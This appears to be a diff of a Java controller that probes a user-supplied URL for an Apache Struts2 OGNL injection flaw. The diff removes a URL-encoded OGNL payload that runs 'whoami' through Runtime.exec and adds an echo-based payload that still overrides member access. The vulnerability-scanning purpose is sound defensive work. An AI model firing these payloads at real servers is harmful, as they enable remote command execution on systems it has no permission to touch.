@@ -37,22 +37,18 @@ public class XController {
 	@RequestMapping("/detectionUrl.html")
 	public void detectionUrl(HttpServletRequest request,HttpServletResponse response){
 
-		 boolean tag=true;
+
 	   boolean flag=true;
 	   try{
 		String urlInfo = request.getParameter("urlInfo");
-		String uriPage = urlInfo+"?method:%23_memberAccess%3d%40ognl.OgnlContext%20%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command%20%5B0%5D%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5B51020%5D%2c%23c.read%28%23d%29%2c%23kxlzx%3d%20%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28%23d%20%29%2c%23kxlzx.close&command=whoami";
+		String uriPage = urlInfo+"?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=whoami";
 		 flag= this.GetDetection(uriPage);
-		if(flag==false){
-			tag=false;
-		}else{
+		if(!flag){
 			flag = this.PostDetection(uriPage);
-			if(flag==false){
-			  tag=false;	
-			}
+			
 		}
 		response.setContentType("textml;charset=UTF-8");
-		response.getWriter().print(tag);
+		response.getWriter().print(flag);
 	   }catch (Exception e) {
 			e.printStackTrace();
 		   
@@ -78,12 +74,12 @@ public class XController {
 						body=post.getResponseBodyAsString();
 					}
 				   if(code==200&&body!=null){
-					  if(body.indexOf("<!DOCTYPE HTML")==-1){
+					  if(body.indexOf("whoami")==-1){
 						  flag=false;
-						  log.info("有漏洞");
+						  log.info("无....");
 					  }	else{
 						  flag= true;
-						  log.info("没有漏洞");
+						  log.info("发现漏洞");
 					  }
 					}
 				} catch (Exception e) {
@@ -107,10 +103,13 @@ public class XController {
 					body=gets.getResponseBodyAsString();
 				}
 				if(code==200&&body!=null){
-					  if(body.indexOf("<!DOCTYPE HTML")==-1){
+					  if(body.indexOf("whoami")==-1){
 						  flag=false;
-						  log.info("有漏洞");
-                     }	
+						  log.info("无....");
+                     }else{
+						  flag= true;
+						  log.info("发现漏洞");
+					  }	
 				}
 				}catch (Exception e) {
 					e.printStackTrace();
